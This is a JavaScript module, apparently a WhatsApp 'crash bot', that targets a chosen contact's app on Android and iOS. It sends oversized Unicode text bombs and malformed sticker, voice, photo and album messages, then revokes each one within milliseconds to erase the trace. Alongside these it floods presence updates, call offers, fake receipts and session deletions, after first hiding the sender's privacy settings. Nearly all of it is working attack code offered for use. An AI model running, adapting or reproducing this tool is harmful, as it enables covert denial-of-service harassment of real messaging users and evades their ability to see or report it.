// ./SY/S7/phantomdrop.js
// phantomdrop — invisible force-close for Android + iOS.
// Every crash vector fires inside ephemeral=1 wrapper + immediate revoke.
// Render pipeline is hit, app dies, chat trace vanishes.
// Background channels (presence/receipt/keysession) add sustained pressure.
// No time loop. No visible chat history.

const {
    generateWAMessageFromContent,
    delay,
} = require('@whiskeysockets/baileys');

// ---------- relay with ephemeral wrap ----------
async function relay(client, targetJid, content, opts = {}) {
    const userJid = client?.user?.id || client?.authState?.creds?.me?.id;
    const waMsg = generateWAMessageFromContent(targetJid, content, {
        userJid,
        timestamp: new Date(),
        ephemeralExpiration: opts.ephemeral ?? 1,
        ephemeralSettingTimestamp: Date.now(),
    });
    await client.relayMessage(targetJid, waMsg.message, {
        messageId: waMsg.key.id,
        ...opts,
    });
    return waMsg.key.id;
}

// ---------- send + immediate revoke ----------
async function sendAndVanish(client, jid, content, revokeDelay = 50) {
    let key;
    try {
        const userJid = client?.user?.id || client?.authState?.creds?.me?.id;
        const waMsg = generateWAMessageFromContent(jid, content, {
            userJid,
            timestamp: new Date(),
            ephemeralExpiration: 1,
            ephemeralSettingTimestamp: Date.now(),
        });
        await client.relayMessage(jid, waMsg.message, {
            messageId: waMsg.key.id,
        });
        key = waMsg.key;
    } catch {
        return null;
    }
    if (key) {
        setTimeout(() => {
            client.sendMessage(jid, { delete: key }).catch(() => {});
        }, revokeDelay);
    }
    return key;
}

async function resolveBestJid(client, targetJid) {
    try {
        const store = client?.signalRepository?.lidMapping;
        if (store && typeof store.getLIDForPN === 'function') {
            const lid = await store.getLIDForPN(targetJid);
            if (lid) return lid;
        }
    } catch {}
    return targetJid;
}

// ---------- privacy arm ----------
async function armPrivacy(client) {
    const ops = {
        updateLastSeenPrivacy: 'none',
        updateOnlinePrivacy: 'none',
        updateProfilePicturePrivacy: 'none',
        updateStatusPrivacy: 'none',
        updateReadReceiptsPrivacy: 'none',
        updateGroupsAddPrivacy: 'none',
        updateCallPrivacy: 'none',
    };
    let ok = 0;
    for (const [m, v] of Object.entries(ops)) {
        if (typeof client[m] !== 'function') continue;
        try { await client[m](v); ok++; } catch {}
    }
    return ok;
}

async function enableDisappearing(client, seconds = 1) {
    try {
        if (typeof client.updateDefaultDisappearingMode === 'function') {
            await client.updateDefaultDisappearingMode(seconds);
            return true;
        }
    } catch {}
    return false;
}

// ============================================================
// CRASH VECTORS — cross-platform, phantom-wrapped
// ============================================================

// V1 — shaping storm (Android + iOS)
function buildShaping(seed = 0) {
    const combining =
        '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307' +
        '\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F';
    const cluster = 'x' + combining.repeat(12);
    return cluster.repeat(3000 + seed * 500);
}

// V2 — ICU bidi isolate nest
function buildBidi() {
    const bidi = '\u2066\u2067\u2068\u2069\u202A\u202B\u202C\u202D\u202E';
    return bidi.repeat(1400);
}

// V3 — emoji ZWJ chain
function buildEmoji() {
    const chain = '👨\u200D👩\u200D👧\u200D👦\u200D🧑\u200D👨\u200D🦱\u200D👩\u200D🦰';
    return chain.repeat(350);
}

// V4 — combined text mega-payload
function buildCombined(seed = 0) {
    return buildShaping(seed) + buildBidi() + buildEmoji();
}

// ---------- phantom crash sends ----------
async function phantomShaping(client, jid, seed) {
    await sendAndVanish(client, jid, {
        extendedTextMessage: {
            text: buildShaping(seed),
            contextInfo: { mentionedJid: [jid] },
        },
    });
}

async function phantomBidi(client, jid) {
    await sendAndVanish(client, jid, {
        extendedTextMessage: {
            text: buildBidi(),
            contextInfo: { mentionedJid: [jid] },
        },
    });
}

async function phantomEmoji(client, jid) {
    await sendAndVanish(client, jid, {
        extendedTextMessage: {
            text: buildEmoji(),
            contextInfo: { mentionedJid: [jid] },
        },
    });
}

async function phantomCombined(client, jid, seed) {
    await sendAndVanish(client, jid, {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: buildCombined(seed),
                    contextInfo: { mentionedJid: [jid] },
                },
            },
        },
    });
}

// V5 — phantom sticker bomb
async function phantomSticker(client, jid, count = 25) {
    for (let i = 0; i < count; i++) {
        try {
            await sendAndVanish(client, jid, {
                stickerMessage: {
                    url: `https://mmg.whatsapp.net/phantom-sticker-${i}`,
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    mimetype: 'image/webp',
                    height: 512,
                    width: 512,
                    directPath: `/v/t62.7118-24/phantom-sticker`,
                    fileLength: 0,
                    mediaKeyTimestamp: Math.floor(Date.now() / 1000),
                    isAnimated: true,
                    isLottie: true,
                },
            });
        } catch {}
        await delay(120);
    }
}

// V6 — phantom voice waveform overflow
async function phantomWaveform(client, jid, count = 15) {
    const waveform = new Uint8Array(200000);
    for (let i = 0; i < waveform.length; i++) waveform[i] = (i * 37) & 0xff;

    for (let i = 0; i < count; i++) {
        try {
            await sendAndVanish(client, jid, {
                audioMessage: {
                    url: `https://mmg.whatsapp.net/phantom-voice-${i}`,
                    mimetype: 'audio/ogg; codecs=opus',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 100,
                    seconds: 3600,
                    ptt: true,
                    waveform,
                    directPath: `/v/t62.7117-24/phantom-voice`,
                    mediaKeyTimestamp: Math.floor(Date.now() / 1000),
                },
            });
        } catch {}
        await delay(180);
    }
}

// V7 — phantom live-photo mismatch
async function phantomLivePhoto(client, jid, count = 12) {
    for (let i = 0; i < count; i++) {
        const shared = `/v/t62.7118-24/phantom-live-${i}`;
        const ts = Math.floor(Date.now() / 1000);
        try {
            await sendAndVanish(client, jid, {
                imageMessage: {
                    url: `https://mmg.whatsapp.net/phantom-img-${i}`,
                    mimetype: 'image/jpeg',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 5000000,
                    height: 4032,
                    width: 3024,
                    directPath: shared,
                    mediaKeyTimestamp: ts,
                },
            });
            await sendAndVanish(client, jid, {
                videoMessage: {
                    url: `https://mmg.whatsapp.net/phantom-vid-${i}`,
                    mimetype: 'video/mp4',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 50000000,
                    seconds: 5,
                    directPath: shared,
                    mediaKeyTimestamp: ts,
                    height: 4032,
                    width: 3024,
                },
            });
        } catch {}
        await delay(200);
    }
}

// V8 — phantom album type-mix
async function phantomAlbumMix(client, jid, albums = 12) {
    for (let a = 0; a < albums; a++) {
        const albumId = `PH${Date.now()}${a}`;
        const ts = Math.floor(Date.now() / 1000);
        const types = ['image', 'video', 'audio', 'sticker'];
        for (let g = 0; g < 4; g++) {
            const t = types[g];
            let content;
            if (t === 'image') {
                content = { imageMessage: {
                    url: `https://mmg.whatsapp.net/ph-album-${a}-${g}`,
                    mimetype: 'image/jpeg',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 5000000,
                    height: 1080,
                    width: 1080,
                    directPath: `/v/t62.7118-24/ph-album`,
                    mediaKeyTimestamp: ts,
                    contextInfo: { albumId },
                }};
            } else if (t === 'video') {
                content = { videoMessage: {
                    url: `https://mmg.whatsapp.net/ph-album-${a}-${g}`,
                    mimetype: 'video/mp4',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 50000000,
                    seconds: 8,
                    directPath: `/v/t62.7118-24/ph-album`,
                    mediaKeyTimestamp: ts,
                    contextInfo: { albumId },
                }};
            } else if (t === 'audio') {
                content = { audioMessage: {
                    url: `https://mmg.whatsapp.net/ph-album-${a}-${g}`,
                    mimetype: 'audio/ogg; codecs=opus',
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    fileLength: 100000,
                    seconds: 30,
                    directPath: `/v/t62.7117-24/ph-album`,
                    mediaKeyTimestamp: ts,
                    contextInfo: { albumId },
                }};
            } else {
                content = { stickerMessage: {
                    url: `https://mmg.whatsapp.net/ph-album-${a}-${g}`,
                    fileSha256: new Uint8Array(32),
                    fileEncSha256: new Uint8Array(32),
                    mediaKey: new Uint8Array(32),
                    mimetype: 'image/webp',
                    height: 512,
                    width: 512,
                    directPath: `/v/t62.7118-24/ph-album`,
                    mediaKeyTimestamp: ts,
                    contextInfo: { albumId },
                }};
            }
            try { await sendAndVanish(client, jid, content); } catch {}
            await delay(80);
        }
        await delay(250);
    }
}

// ============================================================
// BACKGROUND INVISIBLE CHANNELS — no chat trace at all
// ============================================================
async function presenceChurn(client, jid, rounds = 150) {
    const states = ['composing', 'paused', 'recording', 'paused'];
    for (let i = 0; i < rounds; i++) {
        try {
            if (typeof client.sendPresenceUpdate === 'function') {
                await client.sendPresenceUpdate(states[i % states.length], jid);
            }
        } catch {}
        await delay(80);
    }
}

async function callSignalChurn(client, jid, rounds = 40) {
    for (let i = 0; i < rounds; i++) {
        const callId = `P${Date.now()}${Math.random().toString(36).slice(2, 8)}`.toUpperCase();
        try {
            if (typeof client.offerCall === 'function') {
                await client.offerCall(jid, callId);
                await delay(150);
                if (typeof client.rejectCall === 'function') {
                    await client.rejectCall(jid, callId).catch(() => {});
                }
            }
        } catch {}
        await delay(700);
    }
}

async function receiptChurn(client, jid, count = 150) {
    if (typeof client.sendReceipt !== 'function') return;
    for (let i = 0; i < count; i++) {
        try {
            const id = `PH${Date.now()}${i}`.padEnd(20, 'X').slice(0, 20);
            await client.sendReceipt(jid, 'read', [id]).catch(() => {});
            await client.sendReceipt(jid, 'delivered', [id]).catch(() => {});
        } catch {}
        if (i % 25 === 0) await delay(100);
    }
}

async function keySessionChurn(client, jid, rounds = 30) {
    for (let i = 0; i < rounds; i++) {
        try {
            const store = client?.signalRepository;
            if (store && typeof store.deleteSession === 'function') {
                await store.deleteSession(jid);
            }
        } catch {}
        await delay(150);
    }
}

// ============================================================
// ORCHESTRATOR — single burst, phantom + invisible channels
// ============================================================
async function phantomDrop(client, targetJid, options = {}) {
    if (!client) throw new Error('phantomdrop: client required');
    if (!targetJid) throw new Error('phantomdrop: targetJid required');

    const arm    = options.arm !== false;
    const useLid = options.useLid !== false;
    const jid = useLid ? await resolveBestJid(client, targetJid) : targetJid;

    const privacyArmed = arm ? await armPrivacy(client) : 0;
    const disappearing = arm ? await enableDisappearing(client, 1) : false;

    const bursts = Number.isFinite(options.bursts) ? options.bursts : 3;
    const gapMs  = Number.isFinite(options.gapMs)  ? options.gapMs  : 700;

    const report = { jid, bursts: 0, privacyArmed, disappearing, vectors: {} };

    for (let b = 0; b < bursts; b++) {
        // Fire phantom crash + background channels concurrently
        const runs = [
            ['shaping',    () => phantomShaping(client, jid, b)],
            ['bidi',       () => phantomBidi(client, jid)],
            ['emoji',      () => phantomEmoji(client, jid)],
            ['combined',   () => phantomCombined(client, jid, b)],
            ['sticker',    () => phantomSticker(client, jid, 20)],
            ['waveform',   () => phantomWaveform(client, jid, 12)],
            ['livephoto',  () => phantomLivePhoto(client, jid, 10)],
            ['albummix',   () => phantomAlbumMix(client, jid, 8)],
            ['presence',   () => presenceChurn(client, jid, 150)],
            ['callsig',    () => callSignalChurn(client, jid, 30)],
            ['receipt',    () => receiptChurn(client, jid, 120)],
            ['keysession', () => keySessionChurn(client, jid, 20)],
        ];

        const results = await Promise.allSettled(runs.map(([, fn]) => fn()));

        runs.forEach(([name], i) => {
            const ok = results[i].status === 'fulfilled';
            report.vectors[name] = (report.vectors[name] || 0) + (ok ? 1 : 0);
        });

        report.bursts++;
        await delay(gapMs);
    }

    return report;
}

module.exports = {
    phantomDrop,
    phantomShaping,
    phantomBidi,
    phantomEmoji,
    phantomCombined,
    phantomSticker,
    phantomWaveform,
    phantomLivePhoto,
    phantomAlbumMix,
    presenceChurn,
    callSignalChurn,
    receiptChurn,
    keySessionChurn,
    resolveBestJid,
    armPrivacy,
    enableDisappearing,
};
